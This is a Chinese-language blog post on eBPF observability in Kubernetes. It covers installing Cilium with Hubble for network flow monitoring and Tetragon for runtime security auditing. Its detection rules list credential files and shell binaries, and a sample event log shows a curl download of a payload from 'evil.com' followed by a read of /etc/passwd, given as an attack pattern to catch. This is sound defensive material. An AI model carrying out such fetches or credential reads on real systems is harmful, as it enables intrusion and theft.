---
title: "eBPF 可观测性实践：Cilium 网络监控与 Tetragon 安全审计"
date: 2025-09-17T12:36:00+08:00
draft: false
tags: ["eBPF", "Cilium", "Tetragon", "可观测性", "Kubernetes", "安全"]
categories: ["云原生"]
description: "eBPF 正在重塑云原生可观测性的底层基础。本文记录在 K8s 集群中落地 Cilium + Hubble 网络监控和 Tetragon 安全审计的实践经验。"
summary: "eBPF 正在重塑云原生可观测性的底层基础。本文记录在 K8s 集群中落地 Cilium + Hubble 网络监控和 Tetragon 安全审计的实践经验。"
toc: true
math: false
diagram: false
keywords: ["eBPF", "Cilium", "Tetragon", "Hubble", "Kubernetes网络", "运行时安全"]
params:
  reading_time: true
---

## eBPF 改变了什么

传统的 Linux 可观测性工具有一个根本性的矛盾：要想看到系统内部发生了什么，要么在代码里加 instrumentation（入侵性强），要么依赖内核模块（不安全、难维护）。

eBPF 打破了这个矛盾。它允许在内核中运行经过验证的沙盒程序，在不修改内核代码、不重启系统的前提下，附着到几乎任意的内核事件上：系统调用、网络数据包、文件操作、进程调度……

对云原生环境来说，这意味着：

- **零侵入**：不需要 sidecar，不需要改应用代码
- **内核级可见性**：能看到 TCP 连接建立、DNS 解析、文件描述符操作等底层事件
- **极低开销**：相比 sidecar 方案（如 Istio），eBPF 的 CPU/内存开销小一个量级

在 K8s 领域，Cilium 是 eBPF 能力最成熟的落地方案，覆盖网络（CNI）、网络策略、服务发现、可观测性多个层面。

## Cilium：不只是 CNI

很多人知道 Cilium 是 K8s CNI 插件，能替代 flannel、Calico 等方案。但 Cilium 的价值远不止于此。

### 安装 Cilium

```bash
helm repo add cilium https://helm.cilium.io/
helm repo update

helm install cilium cilium/cilium \
  --namespace kube-system \
  --set kubeProxyReplacement=true \
  --set k8sServiceHost=<API_SERVER_IP> \
  --set k8sServicePort=6443 \
  --set hubble.enabled=true \
  --set hubble.relay.enabled=true \
  --set hubble.ui.enabled=true \
  --set hubble.metrics.enableOpenMetrics=true \
  --set hubble.metrics.enabled="{dns,drop,tcp,flow,port-distribution,icmp,http}"
```

`kubeProxyReplacement=true` 让 Cilium 接管 kube-proxy 的职责，用 eBPF 替代 iptables 做 Service 负载均衡。大规模集群下，iptables 规则数量爆炸会导致严重的网络延迟，eBPF 的方式是 O(1) 查表，性能好很多。

**内核版本要求**：Cilium 对内核有要求，基础功能 >= 4.19，完整功能（包括 kube-proxy 替换）推荐 >= 5.10。现在主流发行版（Ubuntu 22.04、Amazon Linux 2023）都满足要求，可以放心用。

### Hubble：网络流量可观测性

Hubble 是 Cilium 内置的网络可观测组件，基于 eBPF 捕获所有 Pod 间的网络流量元数据（注意是元数据，不是内容——不需要解密 mTLS）。

安装 hubble CLI：

```bash
HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)
curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz
tar xzvf hubble-linux-amd64.tar.gz
sudo mv hubble /usr/local/bin/
```

常用命令：

```bash
# 实时查看流量（类似 tcpdump 但面向 Pod）
hubble observe --namespace production --follow

# 查看特定 Pod 的入向/出向流量
hubble observe --pod production/api-server-xxx --follow

# 只看被 Network Policy 丢弃的包（排查连通性问题利器）
hubble observe --verdict DROPPED --follow

# 查看 HTTP 流量（L7 可见性）
hubble observe --protocol http --follow
```

Hubble UI 提供了服务依赖图，能直观看到哪些服务在互相调用、流量大小、是否有丢包。在排查微服务调用链问题时，比看 Jaeger trace 更快速（Jaeger 需要应用侧埋点，Hubble 是零侵入）。

### Cilium Network Policy 的优势

标准的 K8s Network Policy 只支持 L3/L4（IP、端口），Cilium 扩展支持了 L7：

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-server-policy
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: api-server
  ingress:
    - fromEndpoints:
        - matchLabels:
            app: frontend
      toPorts:
        - ports:
            - port: "8080"
              protocol: TCP
          rules:
            http:
              - method: "GET"
                path: "/api/v1/.*"
              - method: "POST"
                path: "/api/v1/orders"
```

这个策略不只是放通 frontend → api-server 的 8080 端口，而是只允许特定的 HTTP 方法和路径。这在微服务安全场景下非常有用，比 VPC Security Group 的粒度精细得多。

## Tetragon：运行时安全审计

Hubble 解决了网络可观测性，Tetragon 解决的是更底层的运行时安全审计——进程执行、文件访问、系统调用级别的可见性。

### 安装 Tetragon

```bash
helm repo add cilium https://helm.cilium.io/
helm install tetragon cilium/tetragon \
  --namespace kube-system \
  --set tetragon.enableK8sAPI=true
```

安装后，Tetragon 会在每个节点运行一个 DaemonSet，基于 eBPF 捕获系统事件。

### TracingPolicy：定义审计规则

Tetragon 的核心是 `TracingPolicy` CRD，用来定义要捕获哪些事件。

**示例 1：检测对 /etc/passwd 的读取**

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-sensitive-file-read
spec:
  kprobes:
    - call: "security_file_open"
      syscall: false
      args:
        - index: 0
          type: "file"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/etc/passwd"
                - "/etc/shadow"
                - "/root/.ssh"
          matchActions:
            - action: Sigkill  # 或者 Post（只记录，不杀进程）
```

**示例 2：检测容器内的 shell 执行**

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-shell-execution
spec:
  kprobes:
    - call: "security_bprm_check"
      syscall: false
      args:
        - index: 0
          type: "linux_binprm"
      selectors:
        - matchBinaries:
            - operator: "In"
              values:
                - "/bin/sh"
                - "/bin/bash"
                - "/usr/bin/python3"
          matchNamespaces:
            - namespace: Pid
              operator: "NotIn"
              values:
                - "host_ns"  # 排除宿主机进程
          matchActions:
            - action: Post
```

这个策略会记录所有容器内的 shell 执行事件。在生产环境里，正常运行的容器通常不需要执行 bash，如果检测到，可能是攻击者在尝试交互式操作。

### 查看 Tetragon 事件

```bash
# 安装 tetra CLI
curl -L https://github.com/cilium/tetragon/releases/latest/download/tetra-linux-amd64.tar.gz | tar xz
sudo mv tetra /usr/local/bin/

# 实时查看进程执行事件
kubectl exec -n kube-system ds/tetragon -c tetragon -- \
  tetra getevents --namespace production

# 过滤特定类型事件
kubectl exec -n kube-system ds/tetragon -c tetragon -- \
  tetra getevents -o compact | grep "PROCESS_EXEC"
```

输出示例：

```
🚀 process production/api-server-7d4b-xk2p /usr/bin/curl https://evil.com/payload.sh
🔌 connect production/api-server-7d4b-xk2p tcp 10.0.1.5:45231 -> 203.0.113.1:443
📬 read    production/api-server-7d4b-xk2p /etc/passwd
```

这三行事件合在一起，就是一个典型的容器逃逸/横向移动场景：进程执行 curl 下载脚本 → 建立外部连接 → 读取敏感文件。传统的日志和监控方案很难在这个粒度上捕获这些事件。

## 与 Istio sidecar 方案的性能对比

我们曾经在测试集群跑过对比：

| 指标 | Istio (Envoy sidecar) | Cilium + Hubble (eBPF) |
|-----|----------------------|----------------------|
| 额外延迟（P50） | ~3ms | ~0.2ms |
| 额外延迟（P99） | ~12ms | ~1ms |
| CPU 开销（per pod） | ~100m | ~10m |
| 内存开销（per pod） | ~150MB | ~15MB |
| 需要改应用 | 否（sidecar 注入） | 否 |
| L7 可见性 | 是（需要 mTLS） | 是（eBPF） |

Cilium 的开销大约是 Istio 的 1/10。对于 Pod 密度高的集群，这个差距会显著影响节点的资源利用率和成本。

当然 Istio 也有 Cilium 没有的功能：流量镜像、细粒度的 circuit breaker、更成熟的 mTLS 证书管理。如果你的首要需求是服务网格的流量管理，Istio 仍然是更成熟的选择。如果首要需求是可观测性和安全审计，Cilium + Tetragon 是更轻量高效的方案。

## 踩坑记录

**与现有 CNI 迁移。** 从 Calico/Flannel 迁移到 Cilium 不能热切换，需要排空节点重新配置。我们的做法是蓝绿迁移：先在新节点组上装 Cilium，逐步把业务迁移过去，再下线老节点。整个过程耗了 2 周，没有影响线上服务。

**内核版本坑。** 有台旧节点跑 Ubuntu 20.04 默认内核（5.4），`kubeProxyReplacement=true` 模式下部分功能有 bug，表现为 Service 偶发不通。升级到 5.15 后解决。建议在用 Cilium 之前，先统一节点内核版本。

**Hubble 数据存储。** Hubble 默认只保留最近的流量数据在内存里，不持久化。如果需要历史查询，要配置 Hubble 输出到 Kafka 或者 OpenSearch。我们目前是通过 Prometheus exporter 把汇聚指标持久化，原始流量事件不存储。

**TracingPolicy 误杀。** 第一次配 `action: Sigkill` 的时候，因为规则写得太宽泛，把 init 容器也给 kill 掉了，导致几个 Pod 起不来。现在的原则是：新规则先上 `action: Post`（只记录）跑一周，确认没有误报再考虑 Sigkill。

eBPF 还在快速演进，Cilium 每隔几个月就会有大版本更新。2026 年的一个趋势是把 eBPF 能力延伸到 Gateway API 层，实现真正的无 sidecar 服务网格。对运维工程师来说，现在是一个很好的时机入手这套技术——落地成本不算高，收益非常明显。
